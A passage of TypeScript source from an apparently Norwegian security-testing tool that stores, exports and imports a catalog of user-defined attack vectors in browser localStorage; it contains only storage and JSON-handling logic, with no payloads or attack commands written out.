    ...(vector.mitreId ? ['MITRE ATT&CK / ATLAS'] : []),
  ],
}));

const CUSTOM_VECTORS_STORAGE_KEY = 'wpww_custom_attack_vectors_v1';

/**
 * Get all attack vectors including built-in and user-defined extensions
 */
export function getRegisteredAttackVectors(): AttackVector[] {
  try {
    const raw = localStorage.getItem(CUSTOM_VECTORS_STORAGE_KEY);
    if (!raw) return MASTER_ATTACK_CATALOG;
    const custom: AttackVector[] = JSON.parse(raw);
    return [...MASTER_ATTACK_CATALOG, ...custom];
  } catch (e) {
    console.error('Failed to load custom attack vectors from localStorage', e);
    return MASTER_ATTACK_CATALOG;
  }
}

/**
 * Save an extended custom attack vector created by the user
 */
export function saveCustomAttackVector(newVector: AttackVector): AttackVector[] {
  try {
    const raw = localStorage.getItem(CUSTOM_VECTORS_STORAGE_KEY);
    const existing: AttackVector[] = raw ? JSON.parse(raw) : [];
    
    // Check if updating or creating
    const index = existing.findIndex(v => v.id === newVector.id);
    let updated: AttackVector[];
    if (index >= 0) {
      updated = [...existing];
      updated[index] = { ...newVector, isCustomUserVector: true };
    } else {
      updated = [...existing, { ...newVector, isCustomUserVector: true }];
    }
    
    localStorage.setItem(CUSTOM_VECTORS_STORAGE_KEY, JSON.stringify(updated));
    return [...MASTER_ATTACK_CATALOG, ...updated];
  } catch (e) {
    console.error('Failed to save custom attack vector', e);
    return MASTER_ATTACK_CATALOG;
  }
}

/**
 * Delete a user-created attack vector
 */
export function deleteCustomAttackVector(id: number): AttackVector[] {
  try {
    const raw = localStorage.getItem(CUSTOM_VECTORS_STORAGE_KEY);
    if (!raw) return MASTER_ATTACK_CATALOG;
    const existing: AttackVector[] = JSON.parse(raw);
    const filtered = existing.filter(v => v.id !== id);
    localStorage.setItem(CUSTOM_VECTORS_STORAGE_KEY, JSON.stringify(filtered));
    return [...MASTER_ATTACK_CATALOG, ...filtered];
  } catch (e) {
    console.error('Failed to delete custom attack vector', e);
    return MASTER_ATTACK_CATALOG;
  }
}

/**
 * Export entire catalog as formatted JSON for sharing or compliance export
 */
export function exportAttackCatalogJson(vectors: AttackVector[]): string {
  return JSON.stringify({
    schema: 'WPWW_CYBER_ATTACK_CATALOG_V1',
    exportedAt: new Date().toISOString(),
    totalVectors: vectors.length,
    vectors: vectors,
  }, null, 2);
}

/**
 * Import and validate custom attack vectors from JSON
 */
export function importAttackCatalogJson(jsonString: string): { success: boolean; count: number; error?: string } {
  try {
    const parsed = JSON.parse(jsonString);
    const importedList: AttackVector[] = Array.isArray(parsed) ? parsed : (parsed.vectors || []);
    if (!Array.isArray(importedList) || importedList.length === 0) {
      return { success: false, count: 0, error: 'Ingen gyldige angrepsvektorer funnet i filen.' };
    }

    const raw = localStorage.getItem(CUSTOM_VECTORS_STORAGE_KEY);
    const existing: AttackVector[] = raw ? JSON.parse(raw) : [];

    let count = 0;
    const merged = [...existing];

    for (const item of importedList) {
      if (item.name && item.category && item.payload) {
        const newId = item.id && Number(item.id) > 100 ? item.id : Date.now() + Math.floor(Math.random() * 1000);
        merged.push({
          ...item,
          id: newId,
          isCustomUserVector: true,
          enabled: true,
        });
        count++;
      }
    }

    localStorage.setItem(CUSTOM_VECTORS_STORAGE_KEY, JSON.stringify(merged));
    return { success: true, count };
  } catch (err) {
    return { success: false, count: 0, error: (err as Error).message || 'Ugyldig JSON-format.' };
  }
}
